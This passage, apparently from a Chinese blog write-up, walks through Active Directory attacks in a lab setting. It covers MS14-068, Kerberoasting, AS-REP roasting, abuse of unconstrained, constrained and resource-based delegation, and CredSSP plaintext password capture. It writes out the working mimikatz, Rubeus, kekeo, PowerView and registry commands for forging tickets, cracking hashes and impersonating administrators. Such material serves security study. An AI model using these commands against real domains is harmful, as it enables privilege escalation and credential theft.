kerberos::purge清空票据<br>然后再执行 exploit::ms14068 /user:xxx /password:xxx /domain:xxx /ptt<br>即可。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132222.png" alt="QQ截图20210217132222"></p><p>然后就dir \域控\c$ 试试，如果可以就说明提权成功了（不是每次都能成功的)</p><p>2.golenpac <a href="https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe">https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe</a></p><p>这个工具好用,</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132233.png" alt="QQ截图20210217132233"></p><p>执行类似上述命令，就能返回一个域控的 system权限的cmd shell回来，感觉蛮好用<br>另外在最后指定域控机器时，可以指定域控以外的机器并获取他们的本地system权限用户.<br>但返回的似乎不是域控？</p><h2 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a>kerberoast</h2><p>Kerberoast攻击原理: 攻击者从 TGS-REP 中提取加密的服务票证。 由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码</p><h3 id="How-to-get-SPN"><a href="#How-to-get-SPN" class="headerlink" title="How to get SPN"></a>How to get SPN</h3><p>如何得到域中的所有SPN？</p><p><strong>1.setspn</strong><br>很简单，只需执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn -q *&#x2F;*</span><br></pre></td></tr></table></figure><p>即可</p><p><strong>2.kerberoast工具集的GetUserSpns powershell脚本</strong></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132445.png" alt="QQ截图20210217132445"></p><h3 id="How-to-get-HASH"><a href="#How-to-get-HASH" class="headerlink" title="How to get HASH"></a>How to get HASH</h3><p>如何得到hash？<br>有如下方法</p><p><strong>1.Rubeus.exe</strong></p><p>这个工具github上就有，但是clone下来后需要自己编译成exe.</p><p>然后执行 Rubeus.exe kerberoast指令即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132502.png" alt="QQ截图20210217132502"></p><p><strong>2.mimikatz</strong></p><p>mimikatz真的神器。<br>通过命令 kerberos::ask /target:你所指定的SPN,</p><p><img src="http://www.const27.com/wp-content/uploads/2020/09/image-33.png" alt="img"></p><p>即可通过认证的方式得到一个ST。<br>然后我们在kerberos::list里可以看到我们想要的ST</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132529.png" alt="QQ截图20210217132529"></p><p><strong>3.powershell</strong></p><p>越来越发现powershell在域渗透中的重要性了<br>输入以下指令，即可完成HASH获取</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MySQL&#x2F;win7.xie.com:3306&#x2F;MySQL&quot;</span><br></pre></td></tr></table></figure><p>然后mimikatz导出即可</p><h3 id="How-to-export-hash"><a href="#How-to-export-hash" class="headerlink" title="How to export hash"></a>How to export hash</h3><p>获得了ST票据，但怎么导出？</p><p><strong>1.mimikatz</strong></p><p>导出所有票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132544.png" alt="QQ截图20210217132544"></p><p>可以发现生成了kirbi文件。这就是我们所需要的hash了</p><p><strong>2.Empire Powershell 框架</strong></p><p>github:<a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p><p>我们通过这个框架可以导出hashcat格式的hash.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132627.png" alt="QQ截图20210217132627"></p><h3 id="How-to-crack-HASH"><a href="#How-to-crack-HASH" class="headerlink" title="How to crack HASH"></a>How to crack HASH</h3><p>如何破解HASH?</p><p><strong>1.HASHCAT</strong></p><p>这个工具需要让hash格式为hashcat模式才能进行破解。kribi文件不能放入hashcat进行破解.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 13110 pass.txt hash.txt</span><br></pre></td></tr></table></figure><p><strong>2.kerberoast中的tgsrepcrack.py</strong></p><p>支持kribi文件破解</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 tgsrepcrack.py pass.txt xxx.kribi</span><br></pre></td></tr></table></figure><h3 id="How-to-use-Kerberoast"><a href="#How-to-use-Kerberoast" class="headerlink" title="How to use Kerberoast"></a>How to use Kerberoast</h3><p>既然我们都把ST的加密hash都破解了，那么我们就可以随便改ST中的票据内容了..\ 这里使用的是kerberoast工具集里的kerberoast.py</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500</span><br><span class="line">python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512</span><br><span class="line">## 将票据权限改为administrator</span><br><span class="line">kerberos::ptt PENTESTLAB.kirbi  #将票据注入到内存</span><br></pre></td></tr></table></figure><h2 id="AS-REP-Roast"><a href="#AS-REP-Roast" class="headerlink" title="AS_REP Roast"></a>AS_REP Roast</h2><p>较Kerberoast来说，比较鸡肋。<br>它的原理是在不开启kerberos预身份验证的前提下，获得其他用户的AS_RES，并破解加密session key 的 client hash。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132642.png" alt="QQ截图20210217132642"></p><h3 id="How-to-get-HASH-1"><a href="#How-to-get-HASH-1" class="headerlink" title="How to get HASH"></a>How to get HASH</h3><p><strong>1.Rubeus</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asreproast</span><br></pre></td></tr></table></figure><p>然后就会搜索域中不需要kerberos预验证的用户，并获得ASREP。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132654.png" alt="QQ截图20210217132654"></p><p><strong>2.Empire框架与 ASREPRoast.ps1</strong></p><p>使用Empire框架下的powerview.ps1查找域中设置了 “不需要kerberos预身份验证” 的用户</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line"> Get-DomainUser -PreauthNotRequired</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132707.png" alt="QQ截图20210217132707">然后用 ASREPRoast.ps1 ：<a href="https://github.com/HarmJ0y/ASREPRoast">https://github.com/HarmJ0y/ASREPRoast</a> 获取指定用户的AS-REPhash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -USER xx -Domain xx |Out-file -Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure><p><img src="http://www.const27.com/wp-content/uploads/2020/09/image-41.png" alt="img"></p><p>就会生成一个hash数据文件了</p><h3 id="How-to-crack-hash"><a href="#How-to-crack-hash" class="headerlink" title="How to crack hash"></a>How to crack hash</h3><p>将生成的HASH保存起来，并在下图处加入$23</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132743.png" alt="QQ截图20210217132743"></p><p>然后丢给hashcat 跑</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt pass.txt</span><br></pre></td></tr></table></figure><p>注意这里的pass.txt是自己的明文字典…之前我还一直以为是爆破出来的结果.<br>原来是一个一个的用明文字典去爆破。</p><h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><h3 id="域委派"><a href="#域委派" class="headerlink" title="域委派"></a>域委派</h3><p>域委派是一种域内主机的行为，使某个服务可以以访问的用户的身份去访问另外一个服务。<br>为什么需要域委派呢，比如现在有web服务器和文件服务器，当用户A访问web服务器去请求某个资源时，web服务器上本身并没有该资源，所以web服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：<br>用户A访问web服务器，服务器再以用户A的身份去访问文件服务器。<br>发生域委派的服务一般为机器账户和服务账户。<br>域委派分为三种：非约束性委派，约束性委派，基于资源的约束性委派</p><h4 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h4><p>非约束性委派的原理是：用户想访问服务A，于是向KDC提交认证，KDC发现A是非约束性委派，于是会把TGT放在ST中一并给用户。然后用户用这个ST去访问服务A，服务A就相当于获得了用户的TGT，把TGT放入lsass进程，然后就可以拿着用户的TGT以用户的身份去访问所有用户权限能够访问的服务了。</p><p>非约束性委派的启用：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217134709.png" alt="QQ截图20210217134709"></p><p>为某账户启用 信任此计算机来委派任何服务 即开启非约束性委派。<br>开启后在该用户的 ACL属性会多出一个 flag : WORKSTATION_TRUSTED_FOR_DELEGATION (图截不完，反正这个flag就在箭头所指处的后面)</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217134749.png" alt="QQ截图20210217134749"></p><p>非约束委派的设置需要<code>SeEnableDelegation</code> 特权，该特权通常仅授予域管理员<br>这里说个题外话，域控主机默认是非约束性委派</p><h4 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h4><p>非约束性委派是很不安全的（因为控制了开启非约束性委派的机器，就相当于获得了上面的所有其他用户的TGT），所以更安全的约束性委派诞生了。<br>约束性委派多了两个委派协议，S4U2SELF S4U2PROXY，并且限制了被设置委派的服务的访问范围：仅能被委派到被指定的服务。</p><p>约束性委派的大致流程：<br>用户访问开启约束性委派的服务A<br>（情况一：无S4U2SELF参与）首先需要经过KDC认证，KDC发现服务A开启了约束性委派，于是在TGS_RES返回给用户ST1（可转发ST），用户拿着ST1访问服务A，服务A先与KDC进行身份验证获得一个有效TGT，然后拿着ST1经过S4U2PROXY协议向KDC发起TGS_REQ，KDC返回ST2（用户身份的ST），然后服务A拿着ST2访问指定服务。<br>（情况二：有S4U2SELF参与）用户通过其他方式（如NTLM认证，表单认证等）获取了服务A的信任，但是此时服务A并没有来自用户的ST1，按情况一中的流程，服务A就不能完成委派。所以这个时候服务A会以自己的身份向KDC发起申请获取一个可转发TGT（获取KDC信任），然后用这个TGT发起TGS_REQ获得指定用户的ST1，既然获取了ST1，就继续情况一中的流程即可了。</p><p>也就是说S4U2SELF是用户通过非kerberos协议完成认证的情况下，自动向KDC获取ST1的一个协议。<br>而S4U2PROXY则是将ST1发给KDC，使其变现为成自己可用的 ST2 的一个协议。</p><p>启用方法:</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135048.png" alt="QQ截图20210217135048"></p><p>其中被添加的服务则是允许被委派到的服务</p><p>若启用的是 仅使用kerberos，那么useraccountcontrol属性仅有 workstation_trust_account.<br>若启用任何身份验证协议，就会有 TrustedToAuthenticationForDelegation</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135100.png" alt="QQ截图20210217135100"></p><h4 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h4><p>Windows Server 2012中引入了基于资源的约束性委派。 只能在运行Windows Server 2012或Windows Server 2012 R2及以上的域控制器上配置<br>基于资源的约束性委派，不需要域管理员前来设置，而把设置委派的权限交给了自身。<br>其实就是可以摆脱域控来主动设置自己可以被哪些账户委派访问。</p><h3 id="非约束性委派攻击"><a href="#非约束性委派攻击" class="headerlink" title="非约束性委派攻击"></a>非约束性委派攻击</h3><p>非约束性委派有巨大的安全问题，上面我们说过，非约束性委派的实质就是把用户的TGT存入lassa进程，从而模拟用户身份进行各种委派访问，所以我们只需控制非约束性委派攻击的机器，然后dump出所有的票据，就相当于获得了所有经过该服务进行约束性委派的用户的身份了。</p><h4 id="1-进行非约束性委派账户扫描"><a href="#1-进行非约束性委派账户扫描" class="headerlink" title="1.进行非约束性委派账户扫描"></a>1.进行非约束性委派账户扫描</h4><p>这里提一下怎么创建有SPN的服务账户。<br>只需再域控里执行 setspn -U -A spn_type username 即可<br>其中spn_type即SPN的格式： MSSQLSvc/<FQDN>:[<port> | <instancename>]</p><ul><li><strong>MSSQLSvc</strong> 是要注册的服务。</li><li><FQDN> 是服务器的完全限定域名。</li><li><port> 是 TCP 端口号。</li><li><instancename> 是 SQL Server 实例的名称。</li></ul><p>这里我们随便输一个，比如 sb/caonima 这种都行.</p><p>这里采用powersploit下的powerview.ps1<br>根据我网上很多搜索结果，查找非约束委派服务账户只需调用<br><code>Get-NetUser -Unconstrained -Domain de1ay.com</code><br>这个命令即可，但是我下载下来的powerview里的get-netuser里却没有unconstrained参数，很烦。所以用一个比较原始的方法来判别（适合在用户少的情况下）<br>直接调用 Get-NetUser -SPN 找到所有服务账户或者Get-domaincomputer找到所有机器账户，然后判断其useraccountcontrl里有没有trusted_for_delegation,若有，则说明开启了非约束性委派</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135123.png" alt="QQ截图20210217135123"></p><p>查询非约束委派机器账户则用<br><code>Get-domaincomputer -unconstrained -domain const.com</code></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135236.png" alt="QQ截图20210217135236"></p><h4 id="2-非约束性委派的攻击"><a href="#2-非约束性委派的攻击" class="headerlink" title="2.非约束性委派的攻击"></a>2.非约束性委派的攻击</h4><p>仅能基于机器账户</p><p>如果我们获得了一个非约束性委派账户，我们就可以通过收集内存中的tgt达到任意用户访问的目的。</p><p>在被控制的非约束性委派机器上使用mimikatz。<br><code>privilege::debug</code>提权<br><code>sekurlsa::tickets</code> 查看本机所有票据</p><p>通过以上命令获取票据,如果管理员访问了本机的一些服务，那么它的TGT就会被截获放入内存。</p><p>我们模拟管理员调用非约束性委派机的smb服务</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135342.png" alt="QQ截图20210217135342"></p><p>我们回到非约束委派机，查看票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135358.png" alt="QQ截图20210217135358"></p><p>tgt被截获,我们用 sekurlas::tickets /export 把票据导出来</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135408.png" alt="QQ截图20210217135408"></p><p>然后mimikatz里使用<br><code>kerberos::ptt 票据文件名 将票据注入内存</code><br>访问域控c$</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135419.png" alt="QQ截图20210217135419"></p><p>成功</p><h4 id="3-非约束性委派配合-Spooler打印机服务"><a href="#3-非约束性委派配合-Spooler打印机服务" class="headerlink" title="3.非约束性委派配合 Spooler打印机服务"></a>3.非约束性委派配合 Spooler打印机服务</h4><p>纯非约束性委派攻击很鸡肋，因为必须要其他用户通过你进行委派访问。<br>但是 ：利用Windows打印系统远程协议<code>（MS-RPRN）</code>中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>方法强制任何运行了<code>Spooler</code>服务的计算机以通过<code>Kerberos</code>或<code>NTLM</code>对攻击者选择的目标进行身份验证。 配合非约束性委派攻击，简直爆炸，可以主动拿到其他用户的TGT。-<br>而且splooer服务是默认运行的。（图源WIN7）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135445.png" alt="QQ截图20210217135445"></p><p>使其他主机强行与自己发生身份验证的脚本：需要自己编译一下<a href="https://github.com/leechristensen/SpoolSample.git">https://github.com/leechristensen/SpoolSample.git</a></p><p>在此之前需要开启监听来自其他主机的TGT，这里用的是rubeus<br><code>Rubeus.exe monitor /interval:1 /filteruser:xx</code></p><p>然后使用<code>SpoolSample.exe XX win7</code>,让指定机器访问WIN7进行身份验证</p><p>然后获得TGT，下班。</p><h3 id="约束性委派的攻击"><a href="#约束性委派的攻击" class="headerlink" title="约束性委派的攻击"></a>约束性委派的攻击</h3><p>约束性委派的大致攻击流程是: (利用S4U2SELF=&gt;)如果我们获得了约束性委派机的NTLM hash或者明文密码，我们就可以以此来向KDC发送一个TGT申请，获得一个可转发的TGT。然后用这个可转发的TGT调用S4U2SELF协议，获得一个针对自己的ST1票据（其中ST1票据中的请求用户可以任意伪造）.然后用这个ST1票据去向KDC请求ST2，然后用ST2去访问服务，此时我们访问的身份就是我们任意伪造的身份了.</p><p>重点是只要获得了可转发TGT，约束性委派机就可以任意伪造其他用户的ST1票据请求，太可怕了。</p><p>这个攻击的最大前提是我们得获得约束性委派账户的NTLM HASH或者明文密码,然后我们才能成功的得到可转发TGT，然后才能得到接下来的一切。</p><p>首先配置好约束性委派账户</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135527.png" alt="QQ截图20210217135527"></p><p>注意选用 使用任何身份验证协议</p><p>我们先信息搜集：看哪些用户是开启约束性委派的。一手powerview安排上</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135553.png" alt="QQ截图20210217135553"></p><p>箭头指出的地方就是可以被委派访问的服务</p><p>我们用kekeo来实现攻击.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgt::ask &#x2F;user:xx &#x2F;domain:xx &#x2F;password:xx &#x2F;ticket:test.kirbi这里的&#x2F;password可以改成&#x2F;NTLM:xx</span><br><span class="line">获得TGT转发票据</span><br><span class="line"></span><br><span class="line">tgs::s4u &#x2F;tgt:file_name &#x2F;user:administrator &#x2F;service:cifs&#x2F;DC</span><br><span class="line">tgt处改为刚刚得到的TGT文件的名字，这个命令执行后得到administrator身份的 ST2</span><br></pre></td></tr></table></figure><p>把最后获得的票据用mimikatz kerberos::ptt 注入内存，完事。</p><h3 id="基于资源的约束性委派-1"><a href="#基于资源的约束性委派-1" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h3><p>refer:<a href="https://xz.aliyun.com/t/7454">https://xz.aliyun.com/t/7454</a></p><h4 id="原理的几个点："><a href="#原理的几个点：" class="headerlink" title="原理的几个点："></a>原理的几个点：</h4><p>1.S4U2SELF 协议可以在用户没有配置 TrustedToAuthenticationForDelegation 属性（即开启使用任何协议认证的约束性委派）时被调用，但是返回的ST是不可被转发的。<br>2.基于资源的约束性委派主机 在被另一台主机委派访问时，在S4U2PROXY过程中提交过来的ST如果即使是不可转发的。KDC依旧会返回有效的ST2。<br>3.每个普通域用户默认可以创建至多十个机器账户（ 由MachineAccountQuota属性决定 ），每个机器账户被创建时都会自动注册SPN: <code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN</p><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程:"></a>攻击流程:</h4><p>假设开启基于资源的约束性委派机器为A<br>1.首先要有一个对当前计算机有写权限的账户，才能对A设置可以 被 委派访问的服务账户。<br>2.利用当前账户创建一个机器账户，并配置好机器账户到A的 基于资源的约束性委派<br>3.因为机器账户是我们创建的，我们知道他的密码账户，可以让它利用S4U2SELF协议获得一个不可转发ST。然后用这个不可转发ST通过S4U2PROXY，在基于资源的约束性委派基础上获得有效的访问A cifs服务的ST2。<br>4.用ST2访问A的CIFS服务，权限获得。</p><h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p>这个攻击说白了就是个提权…</p><p>首先我们检查一下域控是否是win2012以上的主机，因为只有这样才能开启 基于资源的约束性委派。</p><p>我们使用powersploit下的powerview脚本。执行命令 get-netdomaincontroller</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135833.png" alt="QQ截图20210217135833"></p><p>可以获得域控WIN版本</p><p>然后我们查看当前用户对哪台主机有写权限。因为是实验，所以我们先来看看怎么配置一个用户对一个机器的权限。<br>直接在域控上找到某主机，然后进入在属性里进入安全选项卡，添加某用户，然后给这个用户分配权限即可。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135859.png" alt="QQ截图20210217135859"></p><p>我们依旧使用powerview。先调用<br><code>Get-DomainUser -Identity username -Properties objectsid</code>来获取当前用户SID<br>然后<code>Get-DomainObjectAcl -Identity 主机名 | ?&#123;$_.SecurityIdentifier -match &quot;刚刚得到的SID&quot;&#125;</code> 查看当前用户对某台主机是否有写权限。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140628.png" alt="QQ截图20210217140628"></p><p>如果有 GenericAll（完全控制权），GenericWrite、WriteProperty、WriteDacl 这些属性，就说明该用户能修改计算机的账户属性。<br>如图看到我们对WIN7进行操作</p><p>好的，我们接下来就要创立一个机器用户了。根据网上搜索结果，使用powermad这个ps脚本可以很快捷的创建一个机器用户。<a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140659.png" alt="QQ截图20210217140659"></p><p>好的，我们添加了一个密码hack，名为hacksystem的机器账户，接下来就是配置hacksystem到WIN7的委派了。我们需要做的，是修改WIN7的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的值 ，这个操作我们用powerview实现。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$SD &#x3D; New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&quot;  </span><br><span class="line">#这儿的sid是我们创建的#机器用户#evilsystem的sid</span><br><span class="line">$SDBytes &#x3D; New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WIN7| Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;&#x3D;$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140726.png" alt="QQ截图20210217140726"></p><p>至于机器账户SID怎么获得，powerview下的 <code>get-domiancomputer hacksystem</code><br>然后使用<code>Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity</code> 查看委派是否设置成功</p><p><code>Set-DomainObject win7 -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose </code>此命令可以清除 msds-allowedtoactonbehalfofotheridentity属性的值</p><p>现在都统统设置好了，开始下一步吧。<br>网上一般用的rubeus，这里我用kekeo吧</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash &#x2F;user:xxx &#x2F;password:xxx &#x2F;domain:xxx</span><br></pre></td></tr></table></figure><p>本地运算出机器用户ntlm hash 这里借用一下别人的图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140944.png" alt="QQ截图20210217140944"></p><p><code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code> 写入票据</p><p>然后我在本机使用以上方法后klist一下，发现确实存在票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140737.png" alt="QQ截图20210217140737"></p><p>但是dir \test1\c$时本机莫名其妙不能进行kerberos验证，我服了》。。但不管怎样，我们拿到银票了</p><h4 id="敏感用户不可委派的绕过"><a href="#敏感用户不可委派的绕过" class="headerlink" title="敏感用户不可委派的绕过"></a>敏感用户不可委派的绕过</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141050.png" alt="QQ截图20210217141050"></p><p>若我们的administrator用户被设置为敏感用户不可委派或者被加入保护组，按理说他的访问就不能进行委派。</p><p>我们在以administrator账户身份进行S4U时，只能进行S4U2SELF，不能进行S4U2PROXY。我们用 <code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code>继续实验administrator，发现确实是这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141131.png" alt="QQ截图20210217141131"></p><p>此时我们用 rubeus.exe describe /ticker:S4Ubase64加密的票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141313.png" alt="QQ截图20210217141313"></p><p>可以发现servicename并没有指定某个服务，仅仅只有一个账户.即发生了服务名称缺失的问题。很简单，把票据修改一下就行了.网上很多说用这个工具<br><a href="https://www.pkisolutions.com/tools/asn1editor/">https://www.pkisolutions.com/tools/asn1editor/</a><br>但实际上rubeus也能完成票据修改<code>rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt</code></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141325.png" alt="QQ截图20210217141325"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141339.png" alt="QQ截图20210217141339"></p><p>完事</p><h2 id="credssp-导出用户明文密码"><a href="#credssp-导出用户明文密码" class="headerlink" title="credssp 导出用户明文密码"></a>credssp 导出用户明文密码</h2><p>CredSSP协议的目的是将用户的明文密码从CredSSP客户端委派给CredSSP服务器。 通常运用于远程桌面服务。</p><p>我们在配置这个协议时，一般在组策略编辑器里配置。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143231.png" alt="QQ截图20210217143231"></p><p>Allow delegating default credentials表示在通过使用受信任的X509证书或Kerberos实现服务器身份验证时自动发送当前用户的凭据，即明文密码。</p><p>Allow delegating default credentials with NTLM-only server authentication表示在通过NTLM实现服务器身份验证时自动发送当前用户的凭据，即明文密码。</p><p>这几个属性在注册表里对应 HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation。</p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>那么这样看，这个攻击流程就很自然了。<br>我们要获得两台机器，一台机器当作远程桌面的服务器，一台当作远程桌面的客户端。<br>在客户端上配置组策略（CREDSSP），使其在远程桌面身份验证时发送明文密码。<br>然后开始远程桌面验证，在服务器上获得客户端发来的明文密码.</p><h3 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h3><p>1.通过修改注册表，改变组策略身份验证的凭据策略(选一个），这一步需要管理员权限，本地或域管</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v AllowDefaultCredentials &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v AllowDefCredentialsWhenNTLMOnly &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v ConcatenateDefaults_AllowDefault &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v ConcatenateDefaults_AllowDefNTLMOnly &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefaultCredentials &#x2F;v 1 &#x2F;t REG_SZ &#x2F;d *</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefCredentialsWhenNTLMOnly &#x2F;v 1 &#x2F;t REG_SZ &#x2F;d *</span><br></pre></td></tr></table></figure><p>一股脑设置好就完事了。。（用户需重新登陆才生效）</p><p>然后开始获取密码</p><p>我们刚刚提到需要两台电脑才能获取密码，其实那只是一个模型，一个机器既可以当作客户端又可以当作服务端的。<br>我们用kekeo实现攻击（本机向本机获取密码时，普通用户即可完成以下操作）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tsssp::server 开启服务端</span><br><span class="line">tsssp::client &#x2F;target:...   